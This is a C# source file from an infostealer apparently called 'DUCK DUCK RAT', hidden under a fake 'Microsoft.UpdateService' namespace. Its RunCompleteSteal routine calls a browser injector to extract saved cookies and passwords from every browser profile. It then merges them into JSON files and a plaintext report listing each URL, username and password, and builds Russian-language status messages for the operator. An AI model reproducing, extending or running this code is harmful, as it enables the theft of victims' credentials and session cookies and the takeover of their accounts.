using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.IO.Compression;
using Newtonsoft.Json.Linq;
using Microsoft.Data.Sqlite;
using DuckDuckRat;
using DuckDuckRat;
using DuckDuckRat.Modules;
using System.Diagnostics;
using System.Threading;

namespace Microsoft.UpdateService.Modules
{
    public class BrowserResult
    {
        public bool Success { get; set; }
        public string Message { get; set; } = "";
        public string OutputDir { get; set; } = "";
        public string LogSnippet { get; set; } = "";
        public int CookieCount { get; set; } = 0;
        public int PasswordCount { get; set; } = 0;
    }

    public class DataService
    {
        private string lastOutput = "";
        private string lastError = "";

        private static void Log(string msg)
        {
            try {
                string line = $"[{DateTime.Now:HH:mm:ss}] [BROWSER] {msg}";
                if (Constants.DEBUG_MODE) Console.WriteLine(line);
                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Constants.APP_DATA_SUBDIR);
                if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
                string logPath = Path.Combine(logDir, Constants.LOG_FILE_NAME);
                File.AppendAllText(logPath, line + Environment.NewLine);
            } catch { }
        }

        public async Task<BrowserResult> RunCompleteSteal()
        {
            var result = new BrowserResult();
            try
            {
                string tempBase = Path.Combine(Path.GetTempPath(), Constants.STEALER_DIR_NAME);
                if (!Directory.Exists(tempBase)) Directory.CreateDirectory(tempBase);
                
                string vOutputDir = Path.Combine(tempBase, "VData");
                if (Directory.Exists(vOutputDir)) try { Directory.Delete(vOutputDir, true); } catch { }
                Directory.CreateDirectory(vOutputDir);

                Log("[BROWSER] Starting Absolute Extraction...");
                
                // Phase 1: Run the actual injector
                await RunChromelevator(vOutputDir);

                // Phase 2: Search for results (Agessive Search)
                string foundDir = "";
                
                // 1. Check specified VOutput
                if (Directory.Exists(vOutputDir) && Directory.GetDirectories(vOutputDir).Length > 0)
                    foundDir = vOutputDir;
                
                // 2. Check default 'output' in WorkDir (elevator might ignore -o if 'all' is used)
                if (string.IsNullOrEmpty(foundDir)) {
                    string alt1 = Path.Combine(ResourceModule.WorkDir, "output");
                    if (Directory.Exists(alt1) && Directory.GetDirectories(alt1).Length > 0)
                        foundDir = alt1;
                }
                
                // 3. Check current dir 'output'
                if (string.IsNullOrEmpty(foundDir)) {
                    string alt2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "output");
                    if (Directory.Exists(alt2) && Directory.GetDirectories(alt2).Length > 0)
                        foundDir = alt2;
                }

                if (!string.IsNullOrEmpty(foundDir))
                {
                    // Consolidate files (Cookies/Passwords)
                    var stats = ConsolidateData(foundDir);
                    result.CookieCount = stats.cookies;
                    result.PasswordCount = stats.passwords;

                    var subDirs = Directory.GetDirectories(foundDir);
                    var names = subDirs.Select(d => Path.GetFileName(d).ToUpper()).ToList();
                    
                    result.Success = true;
                    result.OutputDir = foundDir;
                    result.Message = $"📁 <b>Браузеры:</b> {string.Join(", ", names)}\n🍪 <b>Cookies:</b> {result.CookieCount}\n🔑 <b>Passwords:</b> {result.PasswordCount}";
                    Log($"[BROWSER] Success! Found data in: {foundDir} (C:{result.CookieCount}, P:{result.PasswordCount})");
                }
                else
                {
                    result.Success = false;
                    string snippet = string.IsNullOrEmpty(lastOutput) ? (string.IsNullOrEmpty(lastError) ? "Экстрактор не вернул лог." : lastError) : lastOutput;
                    if (snippet.Length > 300) snippet = "..." + snippet.Substring(snippet.Length - 300);
                    
                    result.Message = $"⚠️ <b>Ошибка сбора:</b> Данные не найдены.\n<code>{snippet.Replace("<", "&lt;").Replace(">", "&gt;")}</code>";
                    Log("[BROWSER] Extraction failed or returned empty output.");
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Message = $"❌ <b>Критическая ошибка:</b> {ex.Message}";
                Log($"[BROWSER] Exception: {ex}");
            }
            return result;
        }

        private (int cookies, int passwords) ConsolidateData(string rootDir)
        {
            int totalCookies = 0;
            int totalPasswords = 0;
            var allCookies = new JArray();
            var allPasswords = new JArray();
            
            var aestheticReport = new StringBuilder();
            aestheticReport.AppendLine("================================================================================");
            aestheticReport.AppendLine("🚀 DUCK DUCK RAT v1: CONSOLIDATED BROWSER SECRETS REPORT");
            aestheticReport.AppendLine("================================================================================" + Environment.NewLine);
 
            try
            {
                if (!Directory.Exists(rootDir)) return (0, 0);
                
                // Get all subdirectories (browsers/profiles)
                var browserDirs = Directory.GetDirectories(rootDir);
                foreach (var browserDir in browserDirs)
                {
                    string browserName = Path.GetFileName(browserDir).ToUpper();
                    foreach (var profileDir in Directory.GetDirectories(browserDir))
                    {
                        string profileName = Path.GetFileName(profileDir);
                        bool profileHasData = false;

                        // 1. Process Cookies
                        string cookieFile = Path.Combine(profileDir, "cookies.json");
                        if (File.Exists(cookieFile)) {
                            try {
                                var json = JArray.Parse(File.ReadAllText(cookieFile));
                                foreach (var c in json) allCookies.Add(c);
                                totalCookies += json.Count;
                            } catch { }
                        }

                        // 2. Process Passwords
                        var passwordFiles = Directory.GetFiles(profileDir, "passwords*.json");
                        foreach (var pFile in passwordFiles) {
                            try {
                                var json = JArray.Parse(File.ReadAllText(pFile));
                                if (json.Count > 0) {
                                    if (!profileHasData) {
                                        aestheticReport.AppendLine($"📂 [BROWSER: {browserName} | PROFILE: {profileName}]");
                                        aestheticReport.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
                                        profileHasData = true;
                                    }

                                    foreach (var p in json) {
                                        allPasswords.Add(p);
                                        totalPasswords++;
                                        
                                        string url = p["url"]?.ToString() ?? "N/A";
                                        string user = p["user"]?.ToString() ?? "N/A";
                                        string pass = p["pass"]?.ToString() ?? "N/A";

                                        aestheticReport.AppendLine($"🌐 URL:      {url}");
                                        aestheticReport.AppendLine($"👤 User:     {user}");
                                        aestheticReport.AppendLine($"🔑 Password: {pass}");
                                        aestheticReport.AppendLine("--------------------------------------------------------------------------------");
                                    }
                                }
                            } catch { }
                        }
                        
                        if (profileHasData) aestheticReport.AppendLine(Environment.NewLine);
                    }
                }

                // Write Master Files
                if (totalCookies > 0)
                    File.WriteAllText(Path.Combine(rootDir, "all_cookies.json"), allCookies.ToString());
                
                if (totalPasswords > 0) {
                    File.WriteAllText(Path.Combine(rootDir, "all_passwords.json"), allPasswords.ToString());
                    
                    aestheticReport.AppendLine("================================================================================");
                    aestheticReport.AppendLine($"✅ EXTRACTION SUMMARY: {totalCookies} Cookies | {totalPasswords} Passwords");
                    aestheticReport.AppendLine("================================================================================");
                    File.WriteAllText(Path.Combine(rootDir, "AESTHETIC_REPORT.txt"), aestheticReport.ToString());
                }
            }
            catch (Exception ex) { Log($"[BROWSER] Consolidation error: {ex.Message}"); }
 
            return (totalCookies, totalPasswords);
        }

        private async Task RunChromelevator(string vOutputDir)
        {
            try
            {
                Log($"[BROWSER] Executing Native Engine: ChromeEngine.ExtractAll({vOutputDir})");
                
                // V6.18: Wait for initialization stability (3s)
                await Task.Delay(3000);

                // V6.18+ Call (Statically Linked) with 60s Watchdog
                var extractTask = Task.Run(() => ChromeEngine.ExtractAll(vOutputDir));
                var timeoutTask = Task.Delay(60000);
                
                var completedTask = await Task.WhenAny(extractTask, timeoutTask);
                
                if (completedTask == extractTask)
                {
                    bool success = await extractTask;
                    if (success)
                        Log("[BROWSER] Native Engine: Success");
                    else
                        Log("[BROWSER] Native Engine: Failed or returned errors");
                }
                else
                {
                    Log("[BROWSER] Native Engine: Watchdog triggered! Process taking too long, skipping to consolidation.");
                }
            }
            catch (Exception ex) { Log($"[BROWSER] Native Engine error: {ex.Message}"); }
        }
    }
}


